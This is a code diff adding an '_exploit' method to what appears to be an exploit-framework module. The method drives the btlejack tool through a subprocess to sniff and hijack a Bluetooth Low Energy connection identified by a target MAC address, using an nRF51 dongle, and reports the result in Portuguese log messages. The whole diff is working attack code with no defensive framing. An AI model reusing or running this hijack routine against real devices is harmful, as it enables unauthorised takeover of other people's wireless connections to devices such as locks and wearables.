@@ -153,3 +153,32 @@ class Exploit(Exploit):
         except Exception as err:
             logger.exception("BTLEJack execution failed")
             print_error(f"BTLEJack failed: {err}")
+
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: sniff and hijack BLE connection via nRF51 dongle."""
+        btlejack_bin = self._find_btlejack()
+        if not btlejack_bin:
+            return
+
+        action = str(self.action).strip().lower()
+        if action == "hijack":
+            target_mac = str(getattr(self, "target", "")).strip()
+            if not target_mac:
+                print_warning("Sem MAC alvo para hijack")
+                return
+            cmd = [btlejack_bin, "-f", target_mac, "-j"]
+            print_status(f"E2E hijack: {' '.join(cmd)}")
+            try:
+                result = subprocess.run(cmd, capture_output=True, timeout=30, check=False)
+                if result.returncode == 0:
+                    print_success("Hijack BLE executado com sucesso")
+                    if result.stdout:
+                        print_info(result.stdout.decode("utf-8", "replace")[:500])
+                else:
+                    print_warning(f"BTLEJack retornou código {result.returncode}")
+            except subprocess.TimeoutExpired:
+                print_info("BTLEJack hijack timeout (30s)")
+            except Exception as exc:
+                print_error(f"BTLEJack hijack falhou: {exc}")
